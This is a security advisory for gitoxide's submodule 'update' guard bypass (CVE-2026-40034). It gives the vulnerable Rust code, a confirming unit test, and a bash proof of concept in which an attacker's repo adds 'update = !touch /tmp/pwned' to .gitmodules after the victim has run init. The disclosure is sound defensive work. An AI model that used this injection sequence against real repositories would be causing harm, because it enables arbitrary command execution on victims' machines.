# [H] gitoxide: CommandForbiddenInModulesConfiguration Bypass in gix_submodule::File::update() Enables Arbitrary Command Execution via .gitmodules

## Summary
Severity: High
Advisory: GHSA-f26g-jm89-4g65
CVE: CVE-2026-40034
CWE: CWE-183, CWE-349, CWE-501, CWE-77
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-f26g-jm89-4g65
Type: github-advisory

## Affected
- crates.io: `gix` — affected >=0.31.0 <0.83.0

## Details
### Summary

[`gix_submodule::File::update()`](https://github.com/GitoxideLabs/gitoxide/blob/main/gix-submodule/src/access.rs#L168) is the API that gates whether an attacker-supplied `.gitmodules` file may set `update = !<shell command>`. The function is designed to return `Err(CommandForbiddenInModulesConfiguration)` unless the `!command` value came from a trusted local source (`.git/config`). Git CVE [CVE-2019-19604](https://nvd.nist.gov/vuln/detail/cve-2019-19604) illustrates why this check is necessary.

However, the guard is implemented incorrectly: it checks whether any section with the same submodule name exists from a non-`.gitmodules` source; it does not verify that the `update` value came from that section.

Once a submodule has been initialized (any workflow that writes `submodule.<name>.url` to `.git/config`), and the attacker subsequently adds `update = !cmd` to `.gitmodules`, the guard passes while the command value falls through to the attacker-controlled file.

On an identical repository state, `git submodule update` aborts with `fatal: invalid value for 'submodule.sub.update'`, while `gix::Submodule::update()` returns `Ok(Some(Update::Command("touch /tmp/pwned")))`.

The vulnerable code was introduced in https://github.com/GitoxideLabs/gitoxide/commit/6a2e6a436f76c8bbf2487f9967413a51356667a0.

### Details

The vulnerable method is `gix_submodule::File::update`: https://github.com/GitoxideLabs/gitoxide/blob/main/gix-submodule/src/access.rs#L168-L193:

```rust
pub fn update(&self, name: &BStr) -> Result<Option<Update>, config::update::Error> {
    let value: Update = match self.config.string(format!("submodule.{name}.update")) {
        //                    ^^^^^^^^^^^^^^^^^^
        //  [A] Reads the value. gix_config::File::string() iterates sections
        //      newest-to-oldest; if the override section lacks `update`, it
        //      falls through to .gitmodules and returns the attacker value.
        //
        // https://github.com/GitoxideLabs/gitoxide/blob/main/gix-config/src/file/access/raw.rs#L76
        Some(v) => v.as_ref().try_into().map_err(|()| config::update::Error::Invalid {
            submodule: name.to_owned(),
            actual: v.into_owned(),
        })?,
        None => return Ok(None),
    };

    if let Update::Command(cmd) = &value {
        let ours = self.config.meta();
        let has_value_from_foreign_section = self
            .config
            .sections_by_name("submodule")
            .into_iter()
            .flatten()
            .any(|s| s.header().subsection_name() == Some(name) && !std::ptr::eq(s.meta(), ours));
            //  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            //  [B] Checks only that SOME section with this name exists from a
            //      non-.gitmodules source. Does NOT check where [A]'s value
            //      came from.
        if !has_value_from_foreign_section {
            return Err(config::update::Error::CommandForbiddenInModulesConfiguration { ... });
        }
    }
    Ok(Some(value))
}
```

### PoC

`git submodule init` copies `submodule.$name.url` and writes `active = true` into `.git/config` ([`init_submodule()`, builtin/submodule--helper.c:438-517](https://github.com/git/git/blob/v2.53.0/builtin/submodule--helper.c#L438-L517)). It does not unconditionally copy `update`.

Since CVE-2019-19604, `git` rejects `.gitmodules` files that contain `update = !cmd` at parse time. However, `init` is a one-time operation - once the `.git/config` section exists, subsequent changes to `.gitmodules` are not re-inited.

So, the attack sequence is:

1. Attacker's repo ships a benign `.gitmodules` (no `update` key).
2. Victim clones and runs `git submodule init` -> `.git/config` contains:
   ```ini
   [submodule "sub"]
       active = true
       url = /tmp/sub-origin
   ```
3. Attacker pushes a new commit adding `update = !cmd` to `.gitmodules`.
4. Victim runs `git pull` -> `.gitmodules` now contains:
   ```ini
   [submodule "sub"]
       path = sub
       url = /tmp/sub-origin
       update = !touch /tmp/pwned
   ```
   while `.git/config` is unchanged.

This is the precise state that bypasses gitoxide's guard:
- The .git/config entry - even though it contains only url and active - causes [`append_submodule_overrides`](https://github.com/GitoxideLabs/gitoxide/blob/dd5c18d9e526e8de462fa40aa047acd097cfa7dc/gix-submodule/src/lib.rs#L41) to create an override section. That section has foreign (non-.gitmodules) metadata, so the existence check at [B] returns true and the guard is disarmed.
- However, because that override section has no update key, the value lookup at [A] skips past it and falls through to the .gitmodules section, returning the attacker's !touch /tmp/pwned.

The bug is the mismatch between what [A] and [B] actually inspect: [A] asks "which section provides the update value?" (answer: .gitmodules), while [B] asks "does any trusted section exist for this submodule?" (answer: yes). A correct guard would ask the same question as [A].

Git itself would refuse to operate on this repository at the next `git submodule update`. The vulnerability is in gitoxide-based consumers that call `Submodule::update()` and trust its output.

### Option 1: Unit test (verified - passes, confirming the bug)

Drop into `gix-submodule/tests/file/mod.rs` inside `mod update`:

```rust
#[test]
fn security_bypass_via_partial_override() {
    use std::str::FromStr;

    // Attacker-controlled .gitmodules
    let gitmodules =
        "[submodule.a]\n url = https://example.com/a\n update = !touch /tmp/pwned";

    // Post-`git submodule init` state: only `url` copied to .git/config
    let repo_config =
        gix_config::File::from_str("[submodule.a]\n url = https://example.com/a").unwrap();

    let module =
        gix_submodule::File::from_bytes(gitmodules.as_bytes(), None, &repo_config).unwrap();

    let result = module.update("a".into());
    // VULNERABLE: prints `Ok(Some(Command("touch /tmp/pwned")))`
    // SECURE:     should be `Err(CommandForbiddenInModulesConfiguration { .. })`
    eprintln!("{:?}", result);
}
```

```console
$ cargo test -p gix-submodule security_bypass -- --nocapture
running 1 test
bypass result: Ok(Some(Command("touch /tmp/pwned")))
test file::update::security_bypass_via_partial_override ... ok
```

### Option 2: End-to-end - git refuses, gitoxide accepts

Verified with **git 2.51.2** and **gix @ `dd5c18d9e`**.

```bash
#!/bin/bash
set -e
cd /tmp
rm -rf evil-repo victim sub-origin 2>/dev/null || true

# --- Setup ---
mkdir sub-origin && cd sub-origin
git init -q && git commit -q --allow-empty -m init
cd /tmp

# --- [1] Attacker creates repo with BENIGN submodule ---
mkdir evil-repo && cd evil-repo
git init -q
git -c protocol.file.allow=always submodule add /tmp/sub-origin sub
git commit -q -m "add submodule (benign)"
cd /tmp

# --- [2] Victim clones and inits (passes git's .gitmodules validation) ---
git -c protocol.file.allow=always clone -q /tmp/evil-repo victim
cd victim
git submodule init
# .git/config now has: [submodule "sub"] active=true, url=..., NO update key
cd /tmp

# --- [3] Attacker adds malicious update to .gitmodules ---
cd evil-repo
cat >> .gitmodules <<'EOF'
	update = !touch /tmp/pwned
EOF
git commit -q -am "add malicious update"
cd /tmp

# --- [4] Victim pulls ---
cd victim
git pull -q
```

Final state:
```
--- .gitmodules:
[submodule "sub"]
        path = sub
        url = /tmp/sub-origin
        update = !touch /tmp/pwned
--- .git/config (submodule section):
[submodule "sub"]
        active = true
        url = /tmp/sub-origin
```

**Upstream git on this state:**
```console
$ cd /tmp/victim && git submodule update
fatal: invalid value for 'submodule.sub.update'
$ echo $?
128
$ test -f /tmp/pwned && echo VULNERABLE || echo SAFE
SAFE
```

**Gitoxide on the same state:**
```rust
// /tmp/gix-repro/main.rs
let repo = gix::open("/tmp/victim")?;
for sm in repo.submodules()?.expect("submodules present") {
    println!("{}: {:?}", sm.name(), sm.update());
}
```
```console
$ cargo run
sub: Ok(Some(Command("touch /tmp/pwned")))
```

The `CommandForbiddenInModulesConfiguration` guard never fires.

### Impact

### Direct

Any downstream code built on `gix` that:
1. Calls `Submodule::update()` to determine the update strategy, and
2. Trusts that `Update::Command(_)` is safe to execute (because `CommandForbiddenInModulesConfiguration` exists as the documented guard)

…will execute attacker-controlled shell commands on `submodule update` against a previously-initialized submodule.

`gix` itself does not currently ship a `submodule update` implementation, so there is no RCE in the `gix` CLI today. However:

- The `Submodule::update()` API is public at `gix/src/submodule/mod.rs:108` and delegates directly to the vulnerable function.
- The error variant name (`CommandForbiddenInModulesConfiguration`) and test suite (`valid_in_overrides` at `gix-submodule/tests/file/mod.rs:272`) explicitly document this as the security boundary.
- Any third-party tool, IDE plugin, or CI integration building submodule-update on top of `gix` inherits this vulnerability.

### Indirect / second-order

- CI/forge integrations that auto-init submodules and then query the update mode
- Editor/IDE extensions using `gix` for submodule info
- Gitoxide-based `init` equivalents - any tool that implements its own init (writing `url` to local config) creates the bypass state without needing the pull-after-init sequence

## References
- https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-f26g-jm89-4g65
- https://nvd.nist.gov/vuln/detail/CVE-2026-40034
- https://github.com/GitoxideLabs/gitoxide/commit/6a2e6a436f76c8bbf2487f9967413a51356667a0
- https://github.com/GitoxideLabs/gitoxide/commit/dd5c18d9e526e8de462fa40aa047acd097cfa7dc
- https://github.com/GitoxideLabs/gitoxide
- https://red.anthropic.com/2026/cvd/findings/ANT-2026-6SNS6KMP
- https://www.vulncheck.com/advisories/gitoxide-command-injection-via-partial-gitmodules-override-in-gix-submodule
